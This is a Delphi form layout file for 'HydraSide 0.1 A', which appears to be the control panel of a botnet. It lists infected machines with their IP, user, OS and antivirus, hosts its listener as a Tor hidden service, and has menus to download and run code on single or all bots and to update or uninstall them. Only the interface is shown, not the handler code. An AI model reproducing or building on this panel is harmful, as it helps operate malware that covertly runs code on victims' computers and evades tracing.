object Form1: TForm1
  Left = 0
  Top = 0
  Caption = 'HydraSide 0.1 A'
  ClientHeight = 507
  ClientWidth = 846
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  Menu = MainMenu1
  OldCreateOrder = False
  OnClose = FormClose
  OnCreate = FormCreate
  DesignSize = (
    846
    507)
  PixelsPerInch = 96
  TextHeight = 13
  object Label7: TLabel
    Left = 488
    Top = 8
    Width = 125
    Height = 13
    Caption = 'Number of Connections  : '
  end
  object ConnsLab: TLabel
    Left = 619
    Top = 8
    Width = 6
    Height = 13
    Caption = '0'
  end
  object Label8: TLabel
    Left = 653
    Top = 8
    Width = 68
    Height = 13
    Caption = 'Socket State :'
  end
  object SockState: TLabel
    Left = 727
    Top = 8
    Width = 43
    Height = 13
    Caption = 'Disactive'
  end
  object Label9: TLabel
    Left = 328
    Top = 8
    Width = 52
    Height = 13
    Caption = 'Tor State :'
  end
  object TorState: TLabel
    Left = 386
    Top = 8
    Width = 59
    Height = 13
    Caption = 'Not Running'
  end
  object PageControl1: TPageControl
    Left = 8
    Top = 19
    Width = 838
    Height = 480
    ActivePage = Settings
    Anchors = [akLeft, akTop, akRight, akBottom]
    TabOrder = 0
    object Bots: TTabSheet
      Caption = 'Bots'
      DesignSize = (
        830
        452)
      object Botz: TListView
        Left = 3
        Top = 3
        Width = 824
        Height = 446
        Anchors = [akLeft, akTop, akRight, akBottom]
        Columns = <
          item
            Caption = 'Socket'
          end
          item
            Caption = 'HWID'
            Width = 70
          end
          item
            Caption = 'Group'
            Width = 100
          end
          item
            Caption = 'IP'
            Width = 95
          end
          item
            Caption = 'Local IP'
            Width = 95
          end
          item
            Caption = 'User'
            Width = 120
          end
          item
            Caption = 'OS'
            Width = 120
          end
          item
            Caption = 'Version'
            Width = 70
          end
          item
            Caption = 'Av / Fw'
            Width = 100
          end>
        GridLines = True
        ReadOnly = True
        PopupMenu = ClientPopup
        TabOrder = 0
        ViewStyle = vsReport
      end
    end
    object Settings: TTabSheet
      Caption = 'Settings'
      ImageIndex = 2
      object Connection: TGroupBox
        Left = 3
        Top = 3
        Width = 326
        Height = 78
        Caption = 'Connection Settings'
        TabOrder = 0
        object Label1: TLabel
          Left = 16
          Top = 24
          Width = 113
          Height = 13
          Caption = 'Connection Password : '
        end
        object Label2: TLabel
          Left = 99
          Top = 51
          Width = 30
          Height = 13
          Caption = 'Port : '
        end
        object ConPasswrd: TEdit
          Left = 135
          Top = 21
          Width = 166
          Height = 21
          TabOrder = 0
          Text = '1234abcd'
        end
        object EdtPort: TEdit
          Left = 135
          Top = 48
          Width = 166
          Height = 21
          TabOrder = 1
          Text = '1515'
        end
      end
      object GroupBox1: TGroupBox
        Left = 335
        Top = 3
        Width = 457
        Height = 182
        Caption = 'Tor Settings'
        TabOrder = 1
        object Label3: TLabel
          Left = 16
          Top = 24
          Width = 51
          Height = 13
          Caption = 'Tor Path : '
        end
        object Label4: TLabel
          Left = 17
          Top = 51
          Width = 50
          Height = 13
          Caption = 'Tor Files : '
        end
        object Label5: TLabel
          Left = 18
          Top = 102
          Width = 49
          Height = 13
          Caption = 'Tor Port : '
        end
        object Label6: TLabel
          Left = 7
          Top = 78
          Width = 60
          Height = 13
          Caption = 'Torrc Path : '
        end
        object EdtTorPath: TEdit
          Left = 73
          Top = 21
          Width = 366
          Height = 21
          TabOrder = 0
          Text = '\TorBin\Tor.exe'
        end
        object edtTorFiles: TEdit
          Left = 73
          Top = 48
          Width = 366
          Height = 21
          TabOrder = 1
          Text = '\TorHostFiles\'
        end
        object edtTorPort: TEdit
          Left = 73
          Top = 102
          Width = 121
          Height = 21
          TabOrder = 2
          Text = '9050'
        end
        object EdtTorec: TEdit
          Left = 73
          Top = 75
          Width = 368
          Height = 21
          TabOrder = 3
          Text = '\Torrc\Torrc'
        end
        object Button1: TButton
          Left = 157
          Top = 146
          Width = 75
          Height = 25
          Caption = 'Start Tor'
          TabOrder = 4
          OnClick = Button1Click
        end
        object Button2: TButton
          Left = 238
          Top = 146
          Width = 75
          Height = 25
          Caption = 'Stop Tor'
          TabOrder = 5
          OnClick = Button2Click
        end
        object Button3: TButton
          Left = 319
          Top = 146
          Width = 135
          Height = 25
          Caption = 'Manage Tor Services'
          TabOrder = 6
          OnClick = Button3Click
        end
        object CbOpenTor: TCheckBox
          Left = 224
          Top = 102
          Width = 169
          Height = 17
          Caption = 'Start Tor On Client Opened'
          TabOrder = 7
        end
      end
      object GroupBox2: TGroupBox
        Left = 3
        Top = 87
        Width = 326
        Height = 98
        Caption = 'Notification Settings'
        TabOrder = 2
        object CBShowNotif: TCheckBox
          Left = 16
          Top = 20
          Width = 201
          Height = 17
          Caption = 'Show Notification Balloon'
          TabOrder = 0
          OnClick = CBShowNotifClick
        end
        object CBShowPopup: TCheckBox
          Left = 16
          Top = 43
          Width = 145
          Height = 17
          Caption = 'Show Popup Notification'
          TabOrder = 1
          OnClick = CBShowPopupClick
        end
        object CBNotifyOnCon: TCheckBox
          Left = 168
          Top = 20
          Width = 133
          Height = 17
          Caption = 'Notify On Connect'
          Enabled = False
          TabOrder = 2
        end
        object CBNotifyDisCon: TCheckBox
          Left = 167
          Top = 43
          Width = 134
          Height = 17
          Caption = 'Notify On Disconnect'
          Enabled = False
          TabOrder = 3
        end
      end
      object GroupBox3: TGroupBox
        Left = 3
        Top = 191
        Width = 326
        Height = 154
        Caption = 'Connection logs'
        TabOrder = 3
        object LogConns: TCheckBox
          Left = 16
          Top = 24
          Width = 97
          Height = 17
          Caption = 'Log Connections'
          TabOrder = 0
          OnClick = LogConnsClick
        end
        object CBLogIncom: TCheckBox
          Left = 32
          Top = 47
          Width = 185
          Height = 17
          Caption = 'Log Attempted Connections'
          Enabled = False
          TabOrder = 1
        end
        object CBLogDis: TCheckBox
          Left = 32
          Top = 70
          Width = 153
          Height = 17
          Caption = 'Log Disconnect'#39's'
          Enabled = False
          TabOrder = 2
        end
        object CBLogConns: TCheckBox
          Left = 32
          Top = 93
          Width = 153
          Height = 17
          Caption = 'Log Connection'#39's'
          Enabled = False
          TabOrder = 3
        end
      end
      object GroupBox4: TGroupBox
        Left = 335
        Top = 191
        Width = 457
        Height = 64
        Caption = 'Debugging'
        TabOrder = 4
        object CBEnableDebug: TCheckBox
          Left = 18
          Top = 24
          Width = 208
          Height = 17
          Caption = 'Enable Debugging Window'
          TabOrder = 0
        end
      end
      object GroupBox5: TGroupBox
        Left = 335
        Top = 261
        Width = 457
        Height = 84
        Caption = 'General Settings'
        TabOrder = 5
        object CBLoadSettings: TCheckBox
          Left = 18
          Top = 24
          Width = 223
          Height = 17
          Caption = 'Load Saved Settings On Client Opened'
          TabOrder = 0
        end
        object Button4: TButton
          Left = 360
          Top = 48
          Width = 91
          Height = 25
          Caption = 'Save My Settings'
          TabOrder = 1
          OnClick = Button4Click
        end
        object Button5: TButton
          Left = 256
          Top = 48
          Width = 98
          Height = 25
          Caption = 'Load My Settings'
          TabOrder = 2
          OnClick = Button5Click
        end
        object CBStartSockOnOpen: TCheckBox
          Left = 18
          Top = 47
          Width = 207
          Height = 17
          Caption = 'Start Socket On Client Opened'
          TabOrder = 3
        end
      end
    end
    object TabSheet1: TTabSheet
      Caption = 'Connection Log'
      ImageIndex = 3
      DesignSize = (
        830
        452)
      object EventLog: TListView
        Left = 3
        Top = 3
        Width = 824
        Height = 445
        Anchors = [akLeft, akTop, akRight, akBottom]
        Columns = <
          item
            Caption = 'Event'
            Width = 200
          end
          item
            Caption = 'Socket'
            Width = 100
          end
          item
            Caption = 'Local Port'
            Width = 100
          end
          item
            Caption = 'DateAndTime'
            Width = 150
          end>
        GridLines = True
        PopupMenu = PMConlogs
        TabOrder = 0
        ViewStyle = vsReport
      end
    end
    object Debug: TTabSheet
      Caption = 'Debug'
      ImageIndex = 1
      DesignSize = (
        830
        452)
      object Logs: TMemo
        Left = 3
        Top = 3
        Width = 824
        Height = 451
        Anchors = [akLeft, akTop, akRight, akBottom]
        PopupMenu = PMDebugger
        TabOrder = 0
      end
    end
  end
  object MainMenu1: TMainMenu
    Left = 208
    Top = 65528
    object M1: TMenuItem
      Caption = 'Menu'
      object N2: TMenuItem
        Caption = '-'
      end
      object E1: TMenuItem
        Caption = 'Exit'
      end
    end
    object S5: TMenuItem
      Caption = 'Socket'
      object S1: TMenuItem
        Caption = 'Start Listening'
        OnClick = S1Click
      end
      object S2: TMenuItem
        Caption = 'Stop Listening'
        OnClick = S2Click
      end
    end
    object o1: TMenuItem
      Caption = 'Tor'
      object S6: TMenuItem
        Caption = 'Start Tor'
        OnClick = S6Click
      end
      object S7: TMenuItem
        Caption = 'Stop Tor'
        OnClick = S7Click
      end
      object M2: TMenuItem
        Caption = 'Mangage'
        OnClick = M2Click
      end
    end
    object A1: TMenuItem
      Caption = 'About'
      OnClick = A1Click
    end
  end
  object TCPServer1: TIdTCPServer
    Bindings = <>
    DefaultPort = 0
    OnConnect = TCPServer1Connect
    OnDisconnect = TCPServer1Disconnect
    OnException = TCPServer1Exception
    OnExecute = TCPServer1Execute
    Left = 192
    Top = 65520
  end
  object ClientPopup: TPopupMenu
    Left = 168
    Top = 65520
    object D1: TMenuItem
      Caption = 'Download And Run '
      OnClick = D1Click
    end
    object N4: TMenuItem
      Caption = '-'
    end
    object M3: TMenuItem
      Caption = 'Mass Commands'
      object D3: TMenuItem
        Caption = 'Download And Run'
        OnClick = D3Click
      end
      object N5: TMenuItem
        Caption = '-'
      end
      object U3: TMenuItem
        Caption = 'Update All Servers'
        OnClick = U3Click
      end
      object U4: TMenuItem
        Caption = 'Uninstall All Servers'
        OnClick = U4Click
      end
    end
    object A6: TMenuItem
      Caption = 'Auto Commands'
      object A7: TMenuItem
        Caption = 'Auto Download And Run '
        OnClick = A7Click
      end
      object A9: TMenuItem
        Caption = 'Auto Update Server'#39's'
        OnClick = A9Click
      end
    end
    object N1: TMenuItem
      Caption = '-'
    end
    object S4: TMenuItem
      Caption = 'Server'
      object C1: TMenuItem
        Caption = 'Close'
        OnClick = C1Click
      end
      object R1: TMenuItem
        Caption = 'Restart'
        OnClick = R1Click
      end
      object U2: TMenuItem
        Caption = 'Update'
        OnClick = U2Click
      end
      object U1: TMenuItem
        Caption = 'Uninstall'
        OnClick = U1Click
      end
    end
  end
  object Ti1: TTrayIcon
    BalloonTitle = 'HydraSide'
    PopupMenu = IconPopup
    Visible = True
    Left = 296
    Top = 65528
  end
  object IconPopup: TPopupMenu
    Left = 224
    Top = 65528
    object S8: TMenuItem
      Caption = 'Show'
    end
    object A2: TMenuItem
      Caption = 'Auto Command'
      object A3: TMenuItem
        Caption = 'Auto Download And Run (All Bots)'
      end
      object A4: TMenuItem
        Caption = 'Auto Download Plugins (All Bots)'
      end
      object A5: TMenuItem
        Caption = 'Auto Update Server (All Bots)'
      end
    end
    object N3: TMenuItem
      Caption = '-'
    end
    object S9: TMenuItem
      Caption = 'Socket'
      object S11: TMenuItem
        Caption = 'Start Listening'
      end
      object S10: TMenuItem
        Caption = 'Stop Listening'
      end
    end
    object E2: TMenuItem
      Caption = 'Exit'
    end
  end
  object PMConlogs: TPopupMenu
    Left = 248
    Top = 65528
    object C3: TMenuItem
      Caption = 'Clear Logs'
      OnClick = C3Click
    end
  end
  object PMDebugger: TPopupMenu
    Left = 272
    Top = 65528
    object C4: TMenuItem
      Caption = 'Clear All'
      OnClick = C4Click
    end
  end
end
